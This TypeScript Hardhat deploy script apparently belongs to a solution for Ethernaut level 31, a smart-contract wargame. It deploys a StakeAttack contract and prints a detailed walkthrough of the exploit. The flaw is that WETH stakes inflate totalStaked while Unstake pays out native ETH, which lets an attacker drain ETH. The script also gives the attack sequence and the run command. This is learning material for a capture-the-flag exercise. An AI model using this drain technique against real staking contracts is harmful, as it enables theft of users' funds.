import { HardhatRuntimeEnvironment } from "hardhat/types";
import { DeployFunction } from "hardhat-deploy/types";
import { isLocalNetwork } from "../utils/network-config";
import { ethers } from "hardhat";

/**
 * Deploys the StakeAttack solution for Ethernaut level 31
 * 
 * To deploy with a specific Stake address:
 * STAKE_ADDRESS=0xYourAddress npx hardhat deploy --tags stake-solution --network sepolia
 *
 * @param hre HardhatRuntimeEnvironment object
 */
const deployStakeSolution: DeployFunction = async function (hre: HardhatRuntimeEnvironment) {
  const { deployments, getNamedAccounts, network, run } = hre;
  const { deploy } = deployments;
  const { deployer } = await getNamedAccounts();
  const chainId = network.config.chainId || 31337;

  console.log("Deploying StakeAttack solution contract with account:", deployer);

  // Get Stake address from environment or from previous deployment
  let stakeAddress = process.env.STAKE_ADDRESS;

  if (!stakeAddress) {
    console.log("STAKE_ADDRESS not provided, fetching from deployments...");
    
    const stakeDeployment = await deployments.getOrNull("Stake");

    if (stakeDeployment) {
      stakeAddress = stakeDeployment.address;
      console.log(`  Stake: ${stakeAddress}`);
    } else {
      throw new Error("Please provide STAKE_ADDRESS environment variable or deploy the instance contract first");
    }
  }

  // Deploy the StakeAttack contract
  const attackContract = await deploy("StakeAttack", {
    from: deployer,
    args: [stakeAddress],
    log: true,
    autoMine: true,
    waitConfirmations: !isLocalNetwork(chainId) ? 5 : 0,
  });

  console.log("StakeAttack deployed to:", attackContract.address);
  console.log("  Target Stake:", stakeAddress);

  // Get contract instances to display current state
  const stakeContract = await ethers.getContractAt("Stake", stakeAddress);
  const attackContractInstance = await ethers.getContractAt("StakeAttack", attackContract.address);
  
  const totalStaked = await stakeContract.totalStaked();
  const contractBalance = await ethers.provider.getBalance(stakeAddress);
  const wethAddress = await stakeContract.WETH();
  const state = await attackContractInstance.checkState();

  console.log("\n=== Current State ===");
  console.log(`Stake Contract: ${stakeAddress}`);
  console.log(`WETH Contract: ${wethAddress}`);
  console.log(`Total Staked: ${ethers.formatEther(totalStaked)} ETH`);
  console.log(`Contract ETH Balance: ${ethers.formatEther(contractBalance)} ETH`);
  console.log(`Attack Contract: ${attackContract.address}`);
  console.log("\nAttack Contract State:");
  console.log(`  Is Staker: ${state.isStaker}`);
  console.log(`  User Stake: ${ethers.formatEther(state.userStake)} ETH`);
  console.log(`  Meets Conditions: ${state.meetsConditions}`);

  console.log("\n=== Win Conditions ===");
  console.log("To pass this level, you must achieve:");
  console.log("1. ✓ Contract ETH balance > 0");
  console.log("2. ✓ totalStaked > Contract ETH balance");
  console.log("3. ✓ You are a staker (Stakers[msg.sender] = true)");
  console.log("4. ✓ Your staked balance = 0 (UserStake[msg.sender] = 0)");

  console.log("\n=== Attack Strategy ===");
  console.log("The exploit leverages an accounting mismatch between WETH and ETH:");
  console.log("");
  console.log("1. The Vulnerability:");
  console.log("   ┌────────────────────────────────────────────────┐");
  console.log("   │ StakeWETH(amount)                              │");
  console.log("   │ ├─ Increases totalStaked by amount             │");
  console.log("   │ ├─ Transfers WETH tokens to contract (ERC20)   │");
  console.log("   │ └─ Does NOT add to ETH balance                 │");
  console.log("   └────────────────────────────────────────────────┘");
  console.log("   ┌────────────────────────────────────────────────┐");
  console.log("   │ Unstake(amount)                                │");
  console.log("   │ ├─ Decreases totalStaked by amount             │");
  console.log("   │ ├─ Sends NATIVE ETH (not WETH!)                │");
  console.log("   │ └─ No check if you staked ETH or WETH          │");
  console.log("   └────────────────────────────────────────────────┘");
  console.log("");
  console.log("2. Attack Sequence:");
  console.log("   Step 1: Get WETH");
  console.log("   └─ Deposit ETH to WETH contract: WETH.deposit{value: X}()");
  console.log("");
  console.log("   Step 2: Approve Stake to spend WETH");
  console.log("   └─ WETH.approve(stakeAddress, amount)");
  console.log("");
  console.log("   Step 3: Stake WETH");
  console.log("   └─ Stake.StakeWETH(0.001001 ether)");
  console.log("   └─ Result: totalStaked +0.001001, ETH balance +0 ⚠️");
  console.log("");
  console.log("   Step 4: Stake ETH");
  console.log("   └─ Stake.StakeETH{value: 0.001001 ether}()");
  console.log("   └─ Result: totalStaked +0.001001, ETH balance +0.001001");
  console.log("   └─ Now: totalStaked = 0.003002, balance = 0.002001");
  console.log("");
  console.log("   Step 5: Unstake partial amount");
  console.log("   └─ Stake.Unstake(0.001001 ether)");
  console.log("   └─ Sends 0.001001 ETH to you");
  console.log("   └─ Result: totalStaked = 0.002001, balance = 0.001");
  console.log("");
  console.log("   Step 6: Unstake remaining");
  console.log("   └─ Stake.Unstake(0.001001 ether)");
  console.log("   └─ Sends 0.001001 ETH to you");
  console.log("   └─ Result: totalStaked = 0.001, balance ≈ 0 (dust)");
  console.log("   └─ Your stake: 0 ✅");
  console.log("");
  console.log("3. Win Conditions Met:");
  console.log("   ✅ Contract balance > 0 (initial 0.001 from deployment)");
  console.log("   ✅ totalStaked (0.001) > balance (near 0)");
  console.log("   ✅ You are a staker (set by StakeWETH/StakeETH)");
  console.log("   ✅ Your stake = 0 (fully unstaked)");

  console.log("\n=== Technical Details ===");
  console.log("StakeWETH function:");
  console.log("```solidity");
  console.log("function StakeWETH(uint256 amount) public returns (bool) {");
  console.log("    require(amount > 0.001 ether, \"Don't be cheap\");");
  console.log("    // ... allowance check ...");
  console.log("    totalStaked += amount;  // ⚠️ Increases totalStaked");
  console.log("    UserStake[msg.sender] += amount;");
  console.log("    // Transfers WETH tokens (ERC20), NOT ETH!");
  console.log("    (bool transfered, ) = WETH.call(...transferFrom...);");
  console.log("    Stakers[msg.sender] = true;");
  console.log("    return transfered;");
  console.log("}");
  console.log("```");
  console.log("");
  console.log("Unstake function:");
  console.log("```solidity");
  console.log("function Unstake(uint256 amount) public returns (bool) {");
  console.log("    require(UserStake[msg.sender] >= amount, \"Don't be greedy\");");
  console.log("    UserStake[msg.sender] -= amount;");
  console.log("    totalStaked -= amount;");
  console.log("    // ⚠️ Sends NATIVE ETH, regardless of what was staked!");
  console.log("    (bool success, ) = payable(msg.sender).call{value: amount}(\"\");");
  console.log("    return success;");
  console.log("}");
  console.log("```");

  console.log("\n=== Why This Works ===");
  console.log("• Contract accepts both ETH and WETH for staking");
  console.log("• totalStaked tracks BOTH types together");
  console.log("• But only ETH staking increases contract's ETH balance");
  console.log("• Unstake ALWAYS sends ETH (even if you staked WETH)");
  console.log("• This creates accounting mismatch: totalStaked ≠ ETH balance");
  console.log("• We can stake WETH, then unstake to drain ETH!");

  console.log("\n=== Attack Contract Methods ===");
  console.log("The attack contract provides multiple ways to execute:");
  console.log("");
  console.log("1. attack() - Automated full attack");
  console.log("   └─ Requires sending 0.002+ ETH with the call");
  console.log("");
  console.log("2. Step-by-step manual execution:");
  console.log("   ├─ step1_GetWETH() - Convert ETH to WETH");
  console.log("   ├─ step2_ApproveWETH(amount) - Approve spending");
  console.log("   ├─ step3_StakeWETH(amount) - Stake WETH");
  console.log("   ├─ step4_StakeETH() - Stake ETH");
  console.log("   └─ step5_Unstake(amount) - Unstake");
  console.log("");
  console.log("3. attackWithHelper() - If contract has ETH already");

  // Verify the contract on non-local networks
  if (!isLocalNetwork(chainId) && process.env.ETHERSCAN_API_KEY) {
    console.log("\nWaiting for blockchain indexers to catch up...");
    await new Promise(resolve => setTimeout(resolve, 60000)); // 60 seconds delay
    
    console.log("Verifying StakeAttack contract on Etherscan...");
    try {
      await run("verify:verify", {
        address: attackContract.address,
        constructorArguments: [stakeAddress],
      });
      console.log("Contract verification successful!");
    } catch (error: any) {
      if (error.message.includes("Already Verified")) {
        console.log("Contract is already verified!");
      } else if (error.message.includes("does not have bytecode")) {
        console.log("Verification failed: Contract bytecode not found on the explorer yet.");
        console.log("You can manually verify later.");
      } else {
        console.error("Verification failed:", error);
      }
    }
  }
  
  console.log("\n----------------------------------------------------");
  console.log("📝 Next Steps:");
  console.log("1. Execute the attack using:");
  console.log(`   ATTACK_CONTRACT_ADDRESS=${attackContract.address} TARGET_ADDRESS=${stakeAddress} npx hardhat run scripts/level-31-stake/attack.ts --network ${network.name}`);
  console.log("\n2. This will:");
  console.log("   - Get WETH tokens");
  console.log("   - Stake WETH (increases totalStaked, no ETH added)");
  console.log("   - Stake ETH (adds to both totalStaked and ETH balance)");
  console.log("   - Unstake everything (drains ETH, creates mismatch)");
  console.log("   - Meet all win conditions!");
  console.log("----------------------------------------------------");
};

export default deployStakeSolution;

// Tags help to select which deploy script to run
deployStakeSolution.tags = ["level-31", "stake-solution"];

// Only add dependency if we're not using provided address
if (!process.env.STAKE_ADDRESS) {
  // This script depends on the Stake contract being deployed first
  deployStakeSolution.dependencies = ["stake"];
}
